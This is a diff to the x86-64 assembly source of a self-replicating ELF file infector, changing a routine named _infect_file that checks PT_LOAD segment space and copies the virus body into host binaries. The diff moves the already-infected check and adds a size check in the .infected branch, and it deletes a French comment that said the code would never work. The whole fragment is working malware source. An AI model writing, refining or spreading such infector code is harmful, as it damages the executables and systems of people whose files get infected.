@@ -503,16 +503,16 @@ _infect_file: ; (string rdi, stat rsi)
 
 			add rdi, 8 * 3 ; let space for params
 
+			xor r9, r9
+			cmp r9, [rel entry_inject]
+			jne .infected
 			; host
+
 			lea rdx, [rel _eof]
 			lea r9, [rel _params]
 			sub rdx, r9
 			cmp rsi, rdx
 			jl .unmap ; if size between PT_LOAD isn't enough -> abort
-
-			xor r9, r9
-			cmp r9, [rel entry_inject]
-			jne .infected
 
 			; ==		copy start of the virus
 			add rdi, r13 ; addr pointer -> mmap
@@ -538,7 +538,10 @@ _infect_file: ; (string rdi, stat rsi)
 			jmp .params
 
 			.infected:
-			; TODO: CA NE MARCHERA JAAAMMAAAIIISS
+			mov rdx, [rel length]
+			cmp rsi, rdx
+			jl .unmap ; if size between PT_LOAD isn't enough -> abort
+
 			mov rdx, [rel length]
 			sub rdx, 8 * 3
 			; copy virus
